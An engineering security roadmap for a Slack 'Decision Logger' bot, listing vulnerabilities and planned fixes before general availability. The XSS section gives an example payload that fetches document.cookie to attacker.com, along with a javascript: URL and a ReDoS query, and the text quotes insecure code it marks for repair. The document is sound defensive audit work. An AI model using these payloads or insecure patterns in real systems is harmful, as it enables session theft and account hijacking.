# Security Roadmap - Decision Logger Bot

**Last Updated:** 2025-12-15
**Status:** Pre-GA Security Hardening
**Target:** Enterprise Security Team Approval

---

## Executive Summary

This document outlines the security vulnerabilities identified in the Decision Logger Slack Bot and the remediation plan before General Availability (GA). The application is currently in **BETA** and undergoing security hardening.

**Current Status:** 37 vulnerabilities identified (3 CRITICAL, 15 HIGH, 19 MEDIUM)
**Target Completion:** 3 weeks before GA launch
**Priority:** Address all CRITICAL and HIGH severity issues before enterprise deployment

---

## Phase 1: CRITICAL Issues (Week 1) - MUST FIX BEFORE DEMO

### 1.1 Secrets Management ⚠️ CRITICAL
**Issue:** Production credentials hardcoded in `.env` file committed to git history
- Slack bot token exposed
- MongoDB credentials exposed
- Jira API token exposed
- Email address exposed

**Risk:** Complete infrastructure compromise

**Remediation:**
- [ ] Immediately revoke ALL exposed credentials (Slack, MongoDB, Jira)
- [ ] Generate new credentials and update in production
- [ ] Remove `.env` from git history using `git filter-branch` or BFG Repo-Cleaner
- [ ] Migrate to secrets management system (Railway environment variables or HashiCorp Vault)
- [ ] Add `.env.example` template without actual secrets
- [ ] Verify `.gitignore` properly excludes `.env`
- [ ] Implement automatic secret scanning in CI/CD (Trufflehog, GitLeaks)

**Timeline:** IMMEDIATE (Day 1)

---

### 1.2 API Authentication ⚠️ CRITICAL
**Issue:** All API endpoints completely unauthenticated - anyone can access, modify, or delete data

**Affected Endpoints:**
- `GET /api/decisions` - View all decisions
- `PUT /api/decisions/:id` - Modify decisions
- `DELETE /api/decisions/:id` - Delete decisions
- `DELETE /api/gdpr/delete-all` - PERMANENT data deletion
- `GET /api/stats` - View statistics
- `GET /api/gdpr/export` - Export all data

**Current "Security":** Only workspace_id parameter (NOT secret, users know their own ID)

**Risk:** Any attacker can:
- View all decisions from any workspace
- Delete all workspace data
- Modify decision records
- Export sensitive data

**Remediation Plan:**

**Option A: Slack OAuth for Dashboard (RECOMMENDED)**
- Add "Sign in with Slack" button to dashboard
- Use Slack OAuth to authenticate users
- Store session in MongoDB or Redis
- Verify user is member of requested workspace
- Add middleware to protect all `/api/*` routes

**Option B: API Key per Workspace**
- Generate unique API key for each workspace on installation
- Store hashed API key in MongoDB
- Require `X-API-Key` header on all API requests
- Rotate keys periodically (90 days)

**Option C: JWT Tokens**
- Issue JWT token after Slack authentication
- Include workspace_id and user_id in token claims
- Validate token signature on every request
- Short expiration (1 hour) with refresh token mechanism

**Implementation Tasks:**
- [ ] Choose authentication method (recommend Option A)
- [ ] Create authentication middleware
- [ ] Add session storage (MongoDB or Redis)
- [ ] Protect all API routes with auth middleware
- [ ] Add proper HTTP 401/403 responses
- [ ] Update dashboard to handle authentication flow
- [ ] Test with multiple workspaces

**Timeline:** Week 1 (5 days)

---

### 1.3 CSRF Protection ⚠️ CRITICAL
**Issue:** OAuth state verification DISABLED - vulnerable to account hijacking

**Current Code:**
```javascript
stateVerification: false, // Disable state verification for public distribution
stateSecret: process.env.SLACK_STATE_SECRET || 'my-state-secret-' + Math.random()
```

**Risk:** Attackers can force users to authorize malicious workspaces

**Remediation:**
- [ ] ENABLE state verification: `stateVerification: true`
- [ ] Use cryptographically secure state secret: `crypto.randomBytes(32).toString('hex')`
- [ ] Store state secret in environment variables (NOT code)
- [ ] Never fall back to weak random generation
- [ ] Add state timeout (5 minutes max)

**Timeline:** Day 2

---

### 1.4 GDPR Deletion Verification ⚠️ CRITICAL
**Issue:** Anyone with workspace_id can permanently delete ALL workspace data - no verification

**Current Code:**
```javascript
if (query.confirm !== 'DELETE_ALL_DATA') {
  res.writeHead(400, ...);
  return;
}
// Proceed with deletion - NO AUTHENTICATION CHECK
```

**Risk:** Accidental or malicious permanent data loss

**Remediation:**
- [ ] Require authentication (see 1.2) before deletion
- [ ] Add email confirmation step (send verification code)
- [ ] Require workspace admin role (not just any member)
- [ ] Add 24-hour grace period (soft delete first)
- [ ] Create audit log entry with user_id, timestamp, IP
- [ ] Add TOTP/2FA for deletion operations
- [ ] Implement deletion job queue (recoverable for 7 days)

**Timeline:** Week 1 (3 days)

---

## Phase 2: HIGH Severity Issues (Week 2)

### 2.1 Cross-Site Scripting (XSS) 🔴 HIGH
**Issue:** Multiple XSS vulnerabilities in dashboard through unsanitized data

**Vulnerable Code Locations:**
1. `dashboard.html:1078` - `innerHTML = decision.alternatives` (no encoding)
2. `dashboard.html:1023` - `href="${d.jira_data.url}"` (URL injection)
3. `dashboard.html:1098` - Jira data HTML construction (no encoding)

**Attack Examples:**
```javascript
// Attacker creates decision with:
alternatives: "<img src=x onerror='fetch(\"https://attacker.com/?cookie=\" + document.cookie)'>"
jira_data.url: "javascript:alert('XSS')"
```

**Remediation:**
- [ ] Use `textContent` instead of `innerHTML` for user data
- [ ] Implement DOMPurify library for HTML sanitization
- [ ] Validate URLs before inserting into `href` attributes
- [ ] Add Content-Security-Policy (CSP) header
- [ ] Encode HTML entities: `<script>` → `&lt;script&gt;`
- [ ] Use template literals with proper escaping

**Example Fix:**
```javascript
// BEFORE (vulnerable):
element.innerHTML = decision.alternatives.replace(/\n/g, '<br>');

// AFTER (safe):
element.textContent = decision.alternatives; // OR
element.innerHTML = DOMPurify.sanitize(decision.alternatives.replace(/\n/g, '<br>'));
```

**Timeline:** Week 2 (2 days)

---

### 2.2 Security Headers 🔴 HIGH
**Issue:** Missing HTTP security headers - vulnerable to client-side attacks

**Current Response:**
```javascript
res.writeHead(200, { 'Content-Type': 'text/html' });
```

**Missing Headers:**
- `Content-Security-Policy` - Allows any script execution
- `X-Content-Type-Options: nosniff` - MIME sniffing attacks
- `X-Frame-Options: DENY` - Clickjacking
- `X-XSS-Protection: 1; mode=block` - XSS filtering
- `Strict-Transport-Security` - HTTPS enforcement
- `Referrer-Policy: no-referrer` - Privacy protection
- `Permissions-Policy` - Feature restrictions

**Remediation:**
- [ ] Install `helmet` npm package
- [ ] Configure CSP to only allow same-origin scripts
- [ ] Add all security headers to responses
- [ ] Test with securityheaders.com
- [ ] Implement in all route handlers

**Example Implementation:**
```javascript
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"]
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true
  }
}));
```

**Timeline:** Week 2 (1 day)

---

### 2.3 Input Validation & Injection Prevention 🔴 HIGH
**Issue:** Weak validation allows injection attacks and DoS

**Vulnerabilities:**
1. **NoSQL Injection:** User-controlled regex in MongoDB queries
2. **ReDoS:** Complex regex patterns cause resource exhaustion
3. **Parameter Pollution:** No duplicate parameter handling
4. **Null Byte Injection:** No null character filtering

**Example Attack:**
```
GET /api/decisions?search=.*.*.*.*.*.*.*.*
→ Causes catastrophic backtracking (ReDoS)
```

**Remediation:**
- [ ] Use parameterized queries (already using MongoDB driver safely)
- [ ] Implement regex timeout (100ms max)
- [ ] Validate all input against whitelist patterns
- [ ] Sanitize before using in regex: `validator.escape()`
- [ ] Add input length limits (already 200 chars, good)
- [ ] Filter null bytes: `input.replace(/\0/g, '')`
- [ ] Use URL API for parsing instead of manual split

**Timeline:** Week 2 (2 days)

---

### 2.4 Rate Limiting & DoS Protection 🔴 HIGH
**Issue:** No rate limiting - vulnerable to abuse and resource exhaustion

**Attack Scenarios:**
- 10,000 requests/sec to `/api/decisions` → Server crash
- 1,000 file uploads → MongoDB storage exhaustion
- Repeated Claude API calls → $10,000+ API bill

**Remediation:**
- [ ] Install `express-rate-limit` package
- [ ] Implement per-IP rate limiting (100 req/min)
- [ ] Implement per-workspace rate limiting (1000 req/hour)
- [ ] Add Claude API call limiting (10 per workspace per hour)
- [ ] Add file upload rate limit (5 files per workspace per hour)
- [ ] Implement request timeout (30 seconds max)
- [ ] Add circuit breaker for Claude API

**Example Implementation:**
```javascript
const rateLimit = require('express-rate-limit');

const apiLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 100, // 100 requests per minute
  message: 'Too many requests, please try again later.',
  standardHeaders: true,
  legacyHeaders: false,
});

app.use('/api/', apiLimiter);
```

**Timeline:** Week 2 (2 days)

---

### 2.5 Data Encryption at Rest 🔴 HIGH
**Issue:** Sensitive data stored in plaintext in MongoDB

**Affected Data:**
- Decision text (may contain confidential discussions)
- Meeting transcripts (confidential business info)
- User emails
- OAuth tokens (bot_token, user_token)

**Remediation:**

**Option A: MongoDB Client-Side Field Level Encryption (RECOMMENDED)**
- Uses MongoDB's built-in encryption
- Encrypt specific fields automatically
- Key managed by application

**Option B: Application-Level Encryption**
- Encrypt data before storing with AES-256-GCM
- Use `crypto` library
- Store encryption key in secure vault

**Implementation Tasks:**
- [ ] Choose encryption method (recommend Option A)
- [ ] Generate data encryption key (DEK) using KMS
- [ ] Encrypt sensitive fields: `decision.text`, `transcript.content`, `installation.bot_token`
- [ ] Store encryption keys in AWS KMS or HashiCorp Vault
- [ ] Implement key rotation schedule (yearly)
- [ ] Test encryption/decryption performance

**Timeline:** Week 2 (3 days)

---

## Phase 3: MEDIUM Severity Issues (Week 3)

### 3.1 Audit Logging 🟡 MEDIUM
**Issue:** Insufficient logging for security investigations

**Missing Logs:**
- Who accessed what data (user_id, workspace_id)
- Failed authentication attempts
- Data deletion events
- Admin actions
- API rate limit violations

**Remediation:**
- [ ] Implement structured logging (Winston or Pino)
- [ ] Add correlation IDs to all requests
- [ ] Log all authentication events
- [ ] Log all data modification events (create, update, delete)
- [ ] Log all GDPR operations (export, delete)
- [ ] Send logs to centralized system (DataDog, ELK, CloudWatch)
- [ ] Create alerting rules for security events

**Timeline:** Week 3 (2 days)

---

### 3.2 File Upload Security 🟡 MEDIUM
**Issue:** Weak file validation - relies only on extension

**Vulnerabilities:**
- Magic number verification missing (could upload EXE as .pdf)
- No antivirus scanning
- No content-type verification
- Predictable file IDs (timestamp-based)

**Remediation:**
- [ ] Verify file magic numbers (first bytes of file)
- [ ] Use `file-type` npm package for MIME detection
- [ ] Integrate ClamAV or VirusTotal API for malware scanning
- [ ] Generate UUIDs for file IDs instead of timestamps
- [ ] Scan extracted text for PII/secrets before storing
- [ ] Implement file quarantine for suspicious uploads

**Timeline:** Week 3 (2 days)

---

### 3.3 Error Handling & Information Disclosure 🟡 MEDIUM
**Issue:** Error messages could leak sensitive information

**Remediation:**
- [ ] Create error response sanitizer
- [ ] Never expose stack traces to users
- [ ] Use generic error messages: "An error occurred"
- [ ] Log detailed errors server-side only
- [ ] Implement request IDs for debugging
- [ ] Create error code system for troubleshooting

**Timeline:** Week 3 (1 day)

---

### 3.4 Secrets Rotation Policy 🟡 MEDIUM
**Issue:** No mechanism for credential rotation

**Remediation:**
- [ ] Document secret rotation procedure
- [ ] Implement automated rotation for API keys (90 days)
- [ ] Add expiration tracking for OAuth tokens
- [ ] Create alerts 30 days before expiration
- [ ] Test rotation in staging environment

**Timeline:** Week 3 (2 days)

---

## Security Testing Plan

### Before Demo to Security Team:
- [ ] Run OWASP ZAP automated security scan
- [ ] Perform manual penetration testing
- [ ] Test authentication bypass attempts
- [ ] Test XSS payloads in all input fields
- [ ] Test SQL/NoSQL injection vectors
- [ ] Test rate limiting effectiveness
- [ ] Verify all secrets removed from git history
- [ ] Run `npm audit` and fix vulnerabilities
- [ ] Test GDPR deletion recovery process

### Security Checklist for Demo:
- [ ] All CRITICAL issues resolved
- [ ] All HIGH issues resolved or documented with mitigation plan
- [ ] Security headers verified with securityheaders.com
- [ ] Authentication working correctly
- [ ] Audit logging capturing all events
- [ ] Encryption verified for sensitive data
- [ ] Rate limiting tested under load
- [ ] GDPR deletion requires proper authorization

---

## Compliance Requirements

### GDPR:
- ✅ Data export functionality exists
- ✅ Data deletion functionality exists
- ⚠️ Need: Audit trail of deletion requests
- ⚠️ Need: User consent tracking
- ⚠️ Need: Data processing agreement documentation

### SOC 2 Type II:
- ❌ Need: Comprehensive audit logging
- ❌ Need: Access control policies
- ❌ Need: Incident response plan
- ❌ Need: Security monitoring and alerting
- ❌ Need: Penetration testing reports

### ISO 27001:
- ❌ Need: Information security policy
- ❌ Need: Risk assessment documentation
- ❌ Need: Asset inventory
- ❌ Need: Encryption policy
- ❌ Need: Access control procedures

---

## Post-GA Security Roadmap

### Quarter 1:
- [ ] Implement SOC 2 compliance program
- [ ] Conduct third-party security audit
- [ ] Implement SIEM for security monitoring
- [ ] Create incident response playbook
- [ ] Implement vulnerability disclosure program

### Quarter 2:
- [ ] Achieve SOC 2 Type II certification
- [ ] Implement automated security testing in CI/CD
- [ ] Create security training for users
- [ ] Implement bug bounty program
- [ ] Annual penetration testing

---

## Resources & References

- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **OWASP API Security:** https://owasp.org/www-project-api-security/
- **Slack Security Best Practices:** https://api.slack.com/security
- **MongoDB Security Checklist:** https://docs.mongodb.com/manual/administration/security-checklist/
- **Node.js Security Best Practices:** https://github.com/goldbergyoni/nodebestpractices#6-security-best-practices

---

## Sign-off

**Prepared by:** Engineering Team
**Reviewed by:** [Security Team Lead]
**Approved by:** [CTO/CISO]
**Date:** [To be completed after remediation]

---

**Next Steps:**
1. Review this roadmap with security team
2. Prioritize based on company's risk tolerance
3. Begin Week 1 remediation immediately
4. Schedule follow-up security review after Phase 1 completion
